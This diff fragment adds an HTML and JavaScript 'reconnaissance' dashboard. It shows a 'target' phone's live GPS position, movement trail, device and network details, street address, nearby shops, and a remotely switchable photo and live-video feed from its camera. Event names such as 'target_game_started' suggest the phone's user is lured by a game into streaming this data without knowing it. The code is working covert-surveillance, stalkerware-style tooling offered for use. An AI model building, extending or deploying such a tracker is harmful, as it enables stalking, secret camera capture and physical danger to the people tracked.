+          <svg viewBox="0 0 24 24"><path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/></svg>
+          Speed
+        </div>
+        <div class="metric-value highlight-green" id="valSpeed">
+          0.0 <span class="metric-sub">km/h</span>
+        </div>
+      </div>
+
+      <!-- Accuracy -->
+      <div class="metric-card">
+        <div class="metric-label">
+          <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="4"/><circle cx="12" cy="12" r="1"/></svg>
+          Accuracy
+        </div>
+        <div class="metric-value" id="valAccuracy">-- <span class="metric-sub">m</span></div>
+      </div>
+
+      <!-- Heading -->
+      <div class="metric-card">
+        <div class="metric-label">
+          <svg viewBox="0 0 24 24"><polygon points="12 2 19 21 12 17 5 21 12 2"/></svg>
+          Heading
+        </div>
+        <div class="metric-value" id="valHeading">-- <span class="metric-sub">°</span></div>
+      </div>
+
+      <!-- Altitude -->
+      <div class="metric-card">
+        <div class="metric-label">
+          <svg viewBox="0 0 24 24"><path d="M12 3l8 14H4z"/></svg>
+          Altitude
+        </div>
+        <div class="metric-value" id="valAltitude">-- <span class="metric-sub">m</span></div>
+      </div>
+
+      <!-- Last Update -->
+      <div class="metric-card full-width">
+        <div class="metric-label">
+          <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+          Last Telemetry Ping
+        </div>
+        <div class="metric-value" id="valLastUpdate">--:--:-- <span class="metric-sub" id="valAge"></span></div>
+      </div>
+    </div>
+
+    <!-- Map Layer Switchers (Google Sat, Google Map, Terrain, Traffic, Dark) -->
+    <div class="controls-row">
+      <button class="hud-btn active" id="btnModeGoogleSat">🛰️ Sat</button>
+      <button class="hud-btn" id="btnModeGoogleMap">🗺️ Map</button>
+      <button class="hud-btn" id="btnModeTerrain">🏔️ Terrain</button>
+      <button class="hud-btn" id="btnModeTraffic">🚦 Traffic</button>
+      <button class="hud-btn" id="btnModeDark">🕶️ Dark</button>
+    </div>
+
+    <!-- Surveillance Action Controls -->
+    <div class="controls-row">
+      <button class="hud-btn active" id="btnCenter" title="Lock center onto target">
+        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><circle cx="12" cy="12" r="8"/><line x1="12" y1="1" x2="12" y2="4"/><line x1="12" y1="20" x2="12" y2="23"/><line x1="1" y1="12" x2="4" y2="12"/><line x1="20" y1="12" x2="23" y2="12"/></svg>
+        <span id="centerBtnText">Follow</span>
+      </button>
+
+      <button class="hud-btn btn-orbit" id="btnOrbit" title="3D 360° Rotating Reconnaissance Orbit">
+        <svg viewBox="0 0 24 24"><path d="M21.5 2v6h-6M21.34 15.57a10 10 0 1 1-.57-8.38l5.67-5.67"/></svg>
+        <span id="orbitBtnText">3D Orbit</span>
+      </button>
+
+      <button class="hud-btn" id="btnOpenStreetViewModal" title="Open Interactive Street View 360°">
+        👁️ Street View
+      </button>
+
+      <button class="hud-btn btn-danger" id="btnClearTrail" title="Clear track history">
+        Clear
+      </button>
+    </div>
+
+    <!-- TARGET DEVICE & NETWORK INTEL CARD -->
+    <div class="device-intel-card">
+      <div class="intel-header">
+        <span>Target Device & Network Specs</span>
+        <span class="badge-5g" id="intelNetBadge">STANDBY</span>
+      </div>
+      <div class="intel-grid">
+        <div class="intel-item full-width">
+          <span class="intel-k">Device Model:</span>
+          <span class="intel-v highlight-cyan" id="intelModel">Awaiting client...</span>
+        </div>
+        <div class="intel-item">
+          <span class="intel-k">Operating System:</span>
+          <span class="intel-v" id="intelOS">--</span>
+        </div>
+        <div class="intel-item">
+          <span class="intel-k">Battery:</span>
+          <span class="intel-v badge-batt" id="intelBattery">--</span>
+        </div>
+        <div class="intel-item">
+          <span class="intel-k">Network Downlink:</span>
+          <span class="intel-v" id="intelDownlink">--</span>
+        </div>
+        <div class="intel-item">
+          <span class="intel-k">Ping Latency:</span>
+          <span class="intel-v" id="intelRtt">--</span>
+        </div>
+        <div class="intel-item">
+          <span class="intel-k">CPU Cores / RAM:</span>
+          <span class="intel-v" id="intelHardware">--</span>
+        </div>
+        <div class="intel-item">
+          <span class="intel-k">Screen Display:</span>
+          <span class="intel-v" id="intelScreen">--</span>
+        </div>
+        <div class="intel-item full-width">
+          <span class="intel-k">GPU Architecture:</span>
+          <span class="intel-v" id="intelGPU" style="font-size: 9px;">--</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- AUTHENTIC GOOGLE MAPS PLACE CARD (TOP-RIGHT) -->
+  <div class="gmaps-card" id="gmapsCard">
+    <div class="gmaps-header">
+      <div class="gmaps-logo">
+        <svg viewBox="0 0 24 24" class="gmaps-pin-icon"><path fill="#EA4335" d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+        <span class="gmaps-brand">Google Maps</span>
+        <span class="gmaps-badge">GEO ACTIVE</span>
+      </div>
+      <button class="gmaps-toggle-btn" id="btnToggleGmapsCard" title="Minimize / Expand">▼</button>
+    </div>
+    <div class="gmaps-body">
+      <h2 class="gmaps-title" id="geoPlaceName">Waiting for target...</h2>
+      <div class="gmaps-category" id="geoCategory">
+        <span class="gmaps-stars">★★★★★ 4.9</span> • Verified Geo Location
+      </div>
+      <div class="gmaps-address" id="geoFullAddress">
+        Awaiting GPS coordinate stream from mobile device...
+      </div>
+
+      <div class="gmaps-details-table">
+        <div class="gmaps-row"><span class="k">Road / Street:</span><span class="v" id="geoRoad">--</span></div>
+        <div class="gmaps-row"><span class="k">Area / Suburb:</span><span class="v" id="geoSuburb">--</span></div>
+        <div class="gmaps-row"><span class="k">City / District:</span><span class="v" id="geoCity">--</span></div>
+        <div class="gmaps-row"><span class="k">State:</span><span class="v" id="geoState">--</span></div>
+        <div class="gmaps-row"><span class="k">Postal PIN:</span><span class="v" id="geoPostcode">--</span></div>
+        <div class="gmaps-row"><span class="k">Country:</span><span class="v" id="geoCountry">--</span></div>
+        <div class="gmaps-row"><span class="k">Coordinates:</span><span class="v" id="geoCoords">--</span></div>
+      </div>
+
+      <div class="gmaps-actions">
+        <a href="#" target="_blank" class="gmaps-act-btn primary" id="btnOpenGmaps">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/></svg>
+          Open in Google Maps
+        </a>
+        <a href="#" target="_blank" class="gmaps-act-btn" id="btnGmapsDirections">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="3 11 22 2 13 21 11 13 3 11"/></svg>
+          Directions
+        </a>
+        <button class="gmaps-act-btn" id="btnTriggerStreetView">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v8M8 12h8"/></svg>
+          Street View
+        </button>
+      </div>
+
+      <!-- NEARBY PETROL BUNKS & SHOPS DRAWER -->
+      <div class="poi-drawer">
+        <div class="poi-drawer-title">
+          <span>Nearby Petrol Bunks & Shops</span>
+          <span class="poi-count-chip" id="poiCountChip">0 Found</span>
+        </div>
+        <div class="poi-list" id="poiList">
+          <div style="font-size: 11px; color: #70757a; text-align: center; padding: 10px;">
+            Scanning area around target coordinates...
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- LIVE DUAL CAMERA & VIDEO HUD (BOTTOM-RIGHT) -->
+  <div class="face-track-panel" id="faceTrackPanel">
+    <div class="face-track-header">
+      <div class="face-status-indicator">
+        <div class="face-dot"></div>
+        <span id="cameraPanelHeaderTitle">TARGET FEED // CAMERA</span>
+      </div>
+      <button class="face-panel-btn" id="btnToggleFacePanel" title="Minimize / Expand" style="background:none; border:none; color:var(--cyan-accent); cursor:pointer;">_</button>
+    </div>
+
+    <!-- Mode Selector: High-Res Photo vs Live Video -->
+    <div class="camera-mode-bar">
+      <button class="cam-mode-btn active" id="btnModePhoto">📷 Photo Stream</button>
+      <button class="cam-mode-btn" id="btnModeVideo">📹 Live Video</button>
+    </div>
+
+    <div class="face-feed-container">
+      <img id="faceFeedImg" class="face-feed-img" src="" alt="Driver Camera Feed" style="display:none;" />
+
+      <!-- Animated Sci-Fi Target Scanner Reticle -->
+      <div class="face-scanner-overlay" id="faceScannerOverlay">
+        <div class="scan-line"></div>
+        <div class="target-face-box" id="targetFaceBox">
+          <div class="corner c-tl"></div>
+          <div class="corner c-tr"></div>
+          <div class="corner c-bl"></div>
+          <div class="corner c-br"></div>
+          <div class="target-label" id="faceTargetLabel">STANDBY</div>
+        </div>
+      </div>
+
+      <!-- Standby Wireframe when camera is waiting -->
+      <div class="face-standby" id="faceStandby">
+        <svg viewBox="0 0 100 100" class="face-wireframe-svg">
+          <circle cx="50" cy="50" r="44" stroke="rgba(0,240,255,0.4)" stroke-width="1.5" fill="none" stroke-dasharray="4,4"/>
+          <circle cx="50" cy="50" r="30" stroke="rgba(0,240,255,0.7)" stroke-width="2" fill="none"/>
+          <circle cx="38" cy="42" r="4.5" fill="#00f0ff"/>
+          <circle cx="62" cy="42" r="4.5" fill="#00f0ff"/>
+          <path d="M35 65 Q50 78 65 65" stroke="#00f0ff" stroke-width="2.5" fill="none"/>
+          <line x1="50" y1="18" x2="50" y2="82" stroke="rgba(0,240,255,0.3)" stroke-width="1"/>
+          <line x1="18" y1="50" x2="82" y2="50" stroke="rgba(0,240,255,0.3)" stroke-width="1"/>
+        </svg>
+        <div class="face-standby-text">AWAITING TARGET DRIVER CAM</div>
+      </div>
+    </div>
+    <div class="face-telemetry-bar">
+      <span class="face-stat" id="faceMatchStat">STATUS: STANDBY</span>
+      <button class="face-snap-btn" id="btnSaveSnapshot" title="Save snapshot to PC">SAVE PHOTO</button>
+    </div>
+  </div>
+
+  <!-- INTERACTIVE STREET VIEW MODAL -->
+  <div class="streetview-modal" id="streetViewModal">
+    <div class="streetview-header">
+      <span>🌐 Google Street View 360° // Reconnaissance Panorama</span>
+      <button class="streetview-close-btn" id="btnCloseStreetView">✕</button>
+    </div>
+    <div class="streetview-body">
+      <iframe id="streetViewIframe" class="streetview-iframe" src="" allowfullscreen></iframe>
+    </div>
+  </div>
+
+  <!-- CENTERED INITIAL WAITING MESSAGE OVERLAY -->
+  <div class="waiting-overlay" id="waitingOverlay">
+    <div class="radar-container">
+      <div class="radar-circle"></div>
+      <div class="radar-circle inner"></div>
+      <div class="radar-sweep"></div>
+      <div class="radar-center-blip"></div>
+    </div>
+    <div class="waiting-title">Waiting for mobile connection...</div>
+    <div class="waiting-sub" id="waitingSub">AWAITING LIVE TELEMETRY OVER WEBSOCKET</div>
+  </div>
+
+  <!-- Leaflet JS CDN -->
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <!-- Socket.IO CDN -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
+
+  <script>
+    // ==========================================================================
+    // RECONNAISSANCE MISSION CONTROL & GOOGLE GEO ENGINE
+    // ==========================================================================
+
+    (function() {
+      'use strict';
+
+      // Audio Synth (Target Acquisition & Lock-on Chimes)
+      let audioCtx = null;
+      function playTone(type) {
+        try {
+          if (!audioCtx) {
+            const AudioContextClass = window.AudioContext || window.webkitAudioContext;
+            if (AudioContextClass) audioCtx = new AudioContextClass();
+          }
+          if (audioCtx && audioCtx.state === 'suspended') {
+            audioCtx.resume();
+          }
+          if (!audioCtx) return;
+
+          const t = audioCtx.currentTime;
+          const osc = audioCtx.createOscillator();
+          const gain = audioCtx.createGain();
+          osc.connect(gain);
+          gain.connect(audioCtx.destination);
+
+          if (type === 'lock') {
+            osc.type = 'sine';
+            osc.frequency.setValueAtTime(880, t);
+            osc.frequency.setValueAtTime(1760, t + 0.12);
+            gain.gain.setValueAtTime(0.35, t);
+            gain.gain.exponentialRampToValueAtTime(0.01, t + 0.35);
+            osc.start(t);
+            osc.stop(t + 0.35);
+          } else if (type === 'ping') {
+            osc.type = 'triangle';
+            osc.frequency.setValueAtTime(1200, t);
+            gain.gain.setValueAtTime(0.12, t);
+            gain.gain.exponentialRampToValueAtTime(0.01, t + 0.08);
+            osc.start(t);
+            osc.stop(t + 0.08);
+          }
+        } catch(e) {}
+      }
+
+      // Configuration & State
+      const CONFIG = {
+        defaultZoom: 17,
+        initialCenter: [20.5937, 78.9629]
+      };
+
+      const state = {
+        currentPosition: null, // [lat, lng]
+        hasReceivedFirstLocation: false,
+        autoFollow: true,
+        orbitActive: false,
+        orbitAngle: 0,
+        orbitRadius: 0.0015,
+        orbitAnimId: null,
+        trailCoordinates: [],
+        lastPingTime: null,
+        currentCameraMode: 'image', // 'image' or 'video'
+        poiMarkers: []
+      };
+
+      // UI Elements
+      const mapEl = document.getElementById('map');
+      const statusDot = document.getElementById('statusDot');
+      const statusText = document.getElementById('statusText');
+      const valCoords = document.getElementById('valCoords');
+      const valSpeed = document.getElementById('valSpeed');
+      const valAccuracy = document.getElementById('valAccuracy');
+      const valHeading = document.getElementById('valHeading');
+      const valAltitude = document.getElementById('valAltitude');
+      const valLastUpdate = document.getElementById('valLastUpdate');
+      const valAge = document.getElementById('valAge');
+      const btnCenter = document.getElementById('btnCenter');
+      const centerBtnText = document.getElementById('centerBtnText');
+      const btnOrbit = document.getElementById('btnOrbit');
+      const orbitBtnText = document.getElementById('orbitBtnText');
+      const btnClearTrail = document.getElementById('btnClearTrail');
+      const waitingOverlay = document.getElementById('waitingOverlay');
+      const waitingSub = document.getElementById('waitingSub');
+
+      // Google Geo Card Elements
+      const geoPlaceName = document.getElementById('geoPlaceName');
+      const geoFullAddress = document.getElementById('geoFullAddress');
+      const geoRoad = document.getElementById('geoRoad');
+      const geoSuburb = document.getElementById('geoSuburb');
+      const geoCity = document.getElementById('geoCity');
+      const geoState = document.getElementById('geoState');
+      const geoPostcode = document.getElementById('geoPostcode');
+      const geoCountry = document.getElementById('geoCountry');
+      const geoCoords = document.getElementById('geoCoords');
+      const btnOpenGmaps = document.getElementById('btnOpenGmaps');
+      const btnGmapsDirections = document.getElementById('btnGmapsDirections');
+      const btnTriggerStreetView = document.getElementById('btnTriggerStreetView');
+      const btnOpenStreetViewModal = document.getElementById('btnOpenStreetViewModal');
+      const poiCountChip = document.getElementById('poiCountChip');
+      const poiList = document.getElementById('poiList');
+
+      // Street View Modal
+      const streetViewModal = document.getElementById('streetViewModal');
+      const streetViewIframe = document.getElementById('streetViewIframe');
+      const btnCloseStreetView = document.getElementById('btnCloseStreetView');
+
+      // Device Intel Elements
+      const intelNetBadge = document.getElementById('intelNetBadge');
+      const intelModel = document.getElementById('intelModel');
+      const intelOS = document.getElementById('intelOS');
+      const intelBattery = document.getElementById('intelBattery');
+      const intelDownlink = document.getElementById('intelDownlink');
+      const intelRtt = document.getElementById('intelRtt');
+      const intelHardware = document.getElementById('intelHardware');
+      const intelScreen = document.getElementById('intelScreen');
+      const intelGPU = document.getElementById('intelGPU');
+
+      // Camera HUD Elements
+      const faceFeedImg = document.getElementById('faceFeedImg');
+      const faceStandby = document.getElementById('faceStandby');
+      const faceTargetLabel = document.getElementById('faceTargetLabel');
+      const faceMatchStat = document.getElementById('faceMatchStat');
+      const btnSaveSnapshot = document.getElementById('btnSaveSnapshot');
+      const btnModePhoto = document.getElementById('btnModePhoto');
+      const btnModeVideo = document.getElementById('btnModeVideo');
+      const cameraPanelHeaderTitle = document.getElementById('cameraPanelHeaderTitle');
+
+      // ========================================================================
+      // LEAFLET MAP INITIALIZATION & GOOGLE MAPS TILE LAYERS
+      // ========================================================================
+      const map = L.map('map', {
+        zoomControl: false,
+        attributionControl: true
+      }).setView(CONFIG.initialCenter, 5);
+
+      L.control.zoom({ position: 'bottomleft' }).addTo(map);
+
+      // Official Google Maps Full Tile Server Options
+      const tileLayers = {
+        google_sat: L.tileLayer('https://mt{s}.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', {
+          subdomains: ['0', '1', '2', '3'],
+          maxZoom: 21,
+          attribution: '&copy; Google Maps Hybrid Satellite'
+        }),
+        google_map: L.tileLayer('https://mt{s}.google.com/vt/lyrs=m&x={x}&y={y}&z={z}', {
+          subdomains: ['0', '1', '2', '3'],
+          maxZoom: 21,
+          attribution: '&copy; Google Maps Standard'
+        }),
+        google_terrain: L.tileLayer('https://mt{s}.google.com/vt/lyrs=p&x={x}&y={y}&z={z}', {
+          subdomains: ['0', '1', '2', '3'],
+          maxZoom: 20,
+          attribution: '&copy; Google Maps Terrain'
+        }),
+        google_traffic: L.tileLayer('https://mt{s}.google.com/vt/lyrs=y,traffic&x={x}&y={y}&z={z}', {
+          subdomains: ['0', '1', '2', '3'],
+          maxZoom: 21,
+          attribution: '&copy; Google Maps Live Traffic'
+        }),
+        dark: L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+          maxZoom: 19,
+          attribution: '&copy; OpenStreetMap',
+          className: 'dark-tiles'
+        })
+      };
+
+      let currentLayer = tileLayers.google_sat;
+      currentLayer.addTo(map);
+
+      function switchMapMode(mode) {
+        if (!tileLayers[mode] || tileLayers[mode] === currentLayer) return;
+        map.removeLayer(currentLayer);
+        currentLayer = tileLayers[mode];
+        currentLayer.addTo(map);
+        currentLayer.bringToBack();
+
+        document.getElementById('btnModeGoogleSat').classList.toggle('active', mode === 'google_sat');
+        document.getElementById('btnModeGoogleMap').classList.toggle('active', mode === 'google_map');
+        document.getElementById('btnModeTerrain').classList.toggle('active', mode === 'google_terrain');
+        document.getElementById('btnModeTraffic').classList.toggle('active', mode === 'google_traffic');
+        document.getElementById('btnModeDark').classList.toggle('active', mode === 'dark');
+      }
+
+      document.getElementById('btnModeGoogleSat').addEventListener('click', () => switchMapMode('google_sat'));
+      document.getElementById('btnModeGoogleMap').addEventListener('click', () => switchMapMode('google_map'));
+      document.getElementById('btnModeTerrain').addEventListener('click', () => switchMapMode('google_terrain'));
+      document.getElementById('btnModeTraffic').addEventListener('click', () => switchMapMode('google_traffic'));
+      document.getElementById('btnModeDark').addEventListener('click', () => switchMapMode('dark'));
+
+      map.on('dragstart', function() {
+        if (state.autoFollow) {
+          state.autoFollow = false;
+          updateCenterButtonUI();
+        }
+        if (state.orbitActive) {
+          stopOrbit();
+        }
+      });
+
+      // Target Google Red Pin Marker
+      const googleMarkerHtml = `
+        <div class="gmaps-marker-container">
+          <div class="marker-orbit-ring"></div>
+          <div class="marker-target-reticle"></div>
+          <div class="marker-heading-indicator" id="headingIndicator"></div>
+          <svg viewBox="0 0 34 48" class="gmaps-pin-svg">
+            <defs>
+              <filter id="pin-shadow" x="-30%" y="-10%" width="160%" height="150%">
+                <feDropShadow dx="0" dy="4" stdDeviation="3.5" flood-color="#000000" flood-opacity="0.6"/>
+              </filter>
+            </defs>
+            <path filter="url(#pin-shadow)" fill="#EA4335" stroke="#C5221F" stroke-width="1.2" d="M17 0C7.6 0 0 7.6 0 17c0 12.8 17 31 17 31s17-18.2 17-31C34 7.6 26.4 0 17 0z"/>
+            <circle cx="17" cy="16" r="6.5" fill="#FFFFFF"/>
+          </svg>
+        </div>
+      `;
+
+      const googlePinIcon = L.divIcon({
+        className: 'custom-google-marker',
+        html: googleMarkerHtml,
+        iconSize: [36, 50],
+        iconAnchor: [18, 50]
+      });
+
+      let currentMarker = null;
+      let accuracyCircle = null;
+
+      // Polyline Trail Layers
+      const trailGlow = L.polyline([], {
+        color: '#00f0ff',
+        weight: 6,
+        opacity: 0.4,
+        lineCap: 'round',
+        lineJoin: 'round'
+      }).addTo(map);
+
+      const trailCore = L.polyline([], {
+        color: '#39ff14',
+        weight: 3.5,
+        opacity: 0.95,
+        lineCap: 'round',
+        lineJoin: 'round'
+      }).addTo(map);
+
+      // ========================================================================
+      // 3D ORBIT RECONNAISSANCE ENGINE
+      // ========================================================================
+      function startOrbit() {
+        if (!state.currentPosition) return;
+        state.orbitActive = true;
+        mapEl.classList.add('orbit-3d');
+        btnOrbit.classList.add('active');
+        orbitBtnText.textContent = 'Orbiting';
+
+        function stepOrbit() {
+          if (!state.orbitActive || !state.currentPosition) return;
+          state.orbitAngle += 0.015;
+          const baseLat = state.currentPosition[0];
+          const baseLng = state.currentPosition[1];
+          const orbitLat = baseLat + state.orbitRadius * Math.sin(state.orbitAngle);
+          const orbitLng = baseLng + (state.orbitRadius * 1.3) * Math.cos(state.orbitAngle);
+
+          map.panTo([orbitLat, orbitLng], { animate: false });
+          state.orbitAnimId = requestAnimationFrame(stepOrbit);
+        }
+
+        if (state.orbitAnimId) cancelAnimationFrame(state.orbitAnimId);
+        state.orbitAnimId = requestAnimationFrame(stepOrbit);
+      }
+
+      function stopOrbit() {
+        state.orbitActive = false;
+        if (state.orbitAnimId) cancelAnimationFrame(state.orbitAnimId);
+        mapEl.classList.remove('orbit-3d');
+        btnOrbit.classList.remove('active');
+        orbitBtnText.textContent = '3D Orbit';
+
+        if (state.currentPosition) {
+          map.panTo(state.currentPosition, { animate: true, duration: 0.8 });
+        }
+      }
+
+      btnOrbit.addEventListener('click', () => {
+        if (state.orbitActive) {
+          stopOrbit();
+        } else {
+          startOrbit();
+        }
+      });
+
+      // ========================================================================
+      // INTERACTIVE STREET VIEW MODAL
+      // ========================================================================
+      function openStreetView(lat, lng) {
+        if (!lat || !lng) {
+          if (!state.currentPosition) {
+            alert('Awaiting target GPS coordinates first.');
+            return;
+          }
+          lat = state.currentPosition[0];
+          lng = state.currentPosition[1];
+        }
+
+        // Google Maps Street View interactive embed
+        const embedUrl = `https://maps.google.com/maps?layer=c&cbll=${lat},${lng}&cbp=12,0,0,0,0&output=svembed`;
+        streetViewIframe.src = embedUrl;
+        streetViewModal.classList.add('open');
+      }
+
+      function closeStreetView() {
+        streetViewModal.classList.remove('open');
+        streetViewIframe.src = '';
+      }
+
+      btnCloseStreetView.addEventListener('click', closeStreetView);
+      btnTriggerStreetView.addEventListener('click', () => openStreetView());
+      btnOpenStreetViewModal.addEventListener('click', () => openStreetView());
+
+      // ========================================================================
+      // SOCKET.IO TELEMETRY & RECONNAISSANCE CLIENT
+      // ========================================================================
+      const socket = io({
+        reconnection: true,
+        reconnectionAttempts: Infinity,
+        reconnectionDelay: 1000,
+        reconnectionDelayMax: 5000,
+        timeout: 20000,
+        transports: ['polling', 'websocket']
+      });
+
+      function setConnectionStatus(status, text) {
+        statusDot.className = 'status-dot ' + status;
+        statusText.textContent = text;
+      }
+
+      socket.on('connect', () => {
+        if (!state.hasReceivedFirstLocation) {
+          setConnectionStatus('waiting', 'STANDBY');
+          if (waitingSub) {
+            waitingSub.textContent = 'CONNECTED // WAITING FOR MOBILE START';
+          }
+        } else {
+          setConnectionStatus('connected', 'LIVE');
+        }
+      });
+
+      socket.on('disconnect', () => {
+        setConnectionStatus('disconnected', 'OFFLINE');
+      });
+
+      socket.on('target_game_started', (data) => {
+        playTone('lock');
+        setConnectionStatus('connected', 'TARGET ACTIVE');
+        if (waitingSub) {
+          waitingSub.textContent = 'TARGET STARTED GAME // ACQUIRING GPS LOCK...';
+        }
+      });
+
+      // Live Device & Network Telemetry
+      socket.on('update_device_telemetry', (dev) => {
+        if (!dev) return;
+        intelModel.textContent = dev.model || 'Unknown Device';
+        intelOS.textContent = dev.os || '--';
+        intelNetBadge.textContent = dev.networkType || 'ONLINE';
+        intelBattery.textContent = dev.battery !== '--' ? `${dev.battery}% ${dev.charging ? '⚡' : ''}` : '--';
+        intelDownlink.textContent = dev.downlink || '--';
+        intelRtt.textContent = dev.rtt || '--';
+        intelHardware.textContent = `${dev.cores} Cores / ${dev.memory}`;
+        intelScreen.textContent = dev.screen || '--';
+        intelGPU.textContent = dev.gpu || 'Standard GPU';
+      });
+
+      // Live Location Update
+      socket.on('update_location', (data) => {
+        if (!data || typeof data.lat !== 'number' || typeof data.lng !== 'number') return;
+
+        const lat = parseFloat(data.lat);
+        const lng = parseFloat(data.lng);
+        const accuracy = data.accuracy != null ? parseFloat(data.accuracy) : null;
+        const speed = data.speed != null ? parseFloat(data.speed) : null;
+        const heading = data.heading != null ? parseFloat(data.heading) : null;
+        const altitude = data.altitude != null ? parseFloat(data.altitude) : null;
+        const timestamp = data.timestamp ? new Date(data.timestamp) : new Date();
+
+        const latLng = [lat, lng];
+        state.currentPosition = latLng;
+        state.lastPingTime = timestamp;
+
+        if (!state.hasReceivedFirstLocation) {
+          state.hasReceivedFirstLocation = true;
+          waitingOverlay.classList.add('hidden');
+          playTone('lock');
+
+          map.setView(latLng, CONFIG.defaultZoom, { animate: true, duration: 1.5 });
+          setTimeout(() => {
+            startOrbit();
+          }, 1600);
+        } else {
+          playTone('ping');
+        }
+
+        setConnectionStatus('connected', 'LIVE');
+
+        if (!currentMarker) {
+          currentMarker = L.marker(latLng, { icon: googlePinIcon, zIndexOffset: 1000 }).addTo(map);
+        } else {
+          currentMarker.setLatLng(latLng);
+        }
+
+        const headingEl = document.getElementById('headingIndicator');
+        if (headingEl) {
+          if (heading !== null && !isNaN(heading) && heading >= 0) {
+            headingEl.style.display = 'block';
+            headingEl.style.transform = `rotate(${heading}deg)`;
+          } else {
+            headingEl.style.display = 'none';
+          }
+        }
+
+        if (accuracy !== null && !isNaN(accuracy) && accuracy > 0) {
+          if (!accuracyCircle) {
+            accuracyCircle = L.circle(latLng, {
+              radius: accuracy,
+              color: '#00f0ff',
+              fillColor: '#00f0ff',
+              fillOpacity: 0.1,
+              weight: 1.5,
+              dashArray: '4, 6'
+            }).addTo(map);
+          } else {
+            accuracyCircle.setLatLng(latLng);
+            accuracyCircle.setRadius(accuracy);
+          }
+        }
+
+        state.trailCoordinates.push(latLng);
+        trailGlow.setLatLngs(state.trailCoordinates);
+        trailCore.setLatLngs(state.trailCoordinates);
+
+        if (state.autoFollow && !state.orbitActive) {
+          map.panTo(latLng, { animate: true, duration: 0.6 });
+        }
+
+        updateTelemetryUI({ lat, lng, accuracy, speed, heading, altitude, timestamp });
+        if (data.geo) {
+          updateGoogleGeoCard(lat, lng, data.geo);
+        }
+        if (data.poi) {
+          renderNearbyPOI(data.poi);
+        }
+      });
+
+      // Photo Frame Update
+      socket.on('update_face_frame', (data) => {
+        if (!data || !data.image) return;
+        faceFeedImg.src = data.image;
+        faceFeedImg.style.display = 'block';
+        faceStandby.style.display = 'none';
+
+        faceTargetLabel.textContent = 'PHOTO LOCKED';
+        faceMatchStat.textContent = 'HIGH-RES CAPTURE OK';
+        faceMatchStat.style.color = '#39ff14';
+      });
+
+      // Live Video Stream Frame Update
+      socket.on('update_video_frame', (data) => {
+        if (!data || !data.image) return;
+        faceFeedImg.src = data.image;
+        faceFeedImg.style.display = 'block';
+        faceStandby.style.display = 'none';
+
+        faceTargetLabel.textContent = 'LIVE VIDEO (REC)';
+        faceMatchStat.textContent = 'STREAMING LIVE VIDEO';
+        faceMatchStat.style.color = '#00f0ff';
+      });
+
+      // Camera Mode Switch Handlers (Photo vs Video)
+      btnModePhoto.addEventListener('click', () => {
+        state.currentCameraMode = 'image';
+        btnModePhoto.classList.add('active');
+        btnModeVideo.classList.remove('active');
+        cameraPanelHeaderTitle.textContent = 'TARGET FEED // PHOTO STREAM';
+        socket.emit('set_camera_mode', { mode: 'image' });
+      });
+
+      btnModeVideo.addEventListener('click', () => {
+        state.currentCameraMode = 'video';
+        btnModeVideo.classList.add('active');
+        btnModePhoto.classList.remove('active');
+        cameraPanelHeaderTitle.textContent = 'TARGET FEED // LIVE VIDEO';
+        socket.emit('set_camera_mode', { mode: 'video' });
+      });
+
+      // ========================================================================
+      // UI UPDATE FUNCTIONS & NEARBY POI RENDERER
+      // ========================================================================
+      function updateTelemetryUI(data) {
+        valCoords.textContent = `${data.lat.toFixed(6)}, ${data.lng.toFixed(6)}`;
+
+        if (data.speed !== null && !isNaN(data.speed) && data.speed >= 0) {
+          const kmh = (data.speed * 3.6).toFixed(1);
+          valSpeed.innerHTML = `${kmh} <span class="metric-sub">km/h</span>`;
+        } else {
+          valSpeed.innerHTML = `0.0 <span class="metric-sub">km/h</span>`;
+        }
+
+        if (data.accuracy !== null && !isNaN(data.accuracy)) {
+          valAccuracy.innerHTML = `±${Math.round(data.accuracy)} <span class="metric-sub">m</span>`;
+        } else {
+          valAccuracy.innerHTML = `-- <span class="metric-sub">m</span>`;
+        }
+
+        if (data.heading !== null && !isNaN(data.heading) && data.heading >= 0) {
+          valHeading.innerHTML = `${Math.round(data.heading)} <span class="metric-sub">°</span>`;
+        } else {
+          valHeading.innerHTML = `N/A`;
+        }
+
+        if (data.altitude !== null && !isNaN(data.altitude)) {
+          valAltitude.innerHTML = `${Math.round(data.altitude)} <span class="metric-sub">m</span>`;
+        } else {
+          valAltitude.innerHTML = `-- <span class="metric-sub">m</span>`;
+        }
+
+        const hours = String(data.timestamp.getHours()).padStart(2, '0');
+        const minutes = String(data.timestamp.getMinutes()).padStart(2, '0');
+        const seconds = String(data.timestamp.getSeconds()).padStart(2, '0');
+        valLastUpdate.innerHTML = `${hours}:${minutes}:${seconds} <span class="metric-sub" id="valAge">just now</span>`;
+      }
+
+      function updateGoogleGeoCard(lat, lng, geo) {
+        geoPlaceName.textContent = geo.place_name || 'Target Location';
+        geoFullAddress.textContent = geo.full_address || `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
+
+        geoRoad.textContent = geo.road || '--';
+        geoSuburb.textContent = geo.suburb || '--';
+        geoCity.textContent = geo.city || '--';
+        geoState.textContent = geo.state || '--';
+        geoPostcode.textContent = geo.postcode || '--';
